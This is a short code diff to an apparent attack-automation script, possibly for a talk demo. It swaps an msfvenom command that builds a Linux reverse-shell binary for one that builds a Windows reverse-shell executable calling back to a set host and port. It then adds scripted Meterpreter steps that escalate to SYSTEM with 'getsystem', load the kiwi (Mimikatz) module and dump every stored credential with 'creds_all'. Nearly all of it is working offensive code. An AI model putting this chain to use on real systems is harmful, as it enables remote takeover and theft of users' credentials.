@@ -1,1 +1,12 @@
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.150.128 LPORT=8080 -f elf > shell_payload_draman_rsa_talk.elf
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.162.11 LPORT=8080 -f exe -o payloads/shell_payload_draman_rsa_talk.exe
+
+
+
+child.sendline("use priv")
+child.expect("meterpreter", timeout=custom_timeout)
+
+child.sendline("getsystem")
+child.expect("meterpreter", timeout=custom_timeout)
+child.sendline("load kiwi")
+child.expect("meterpreter", timeout=custom_timeout)
+child.sendline("creds_all")
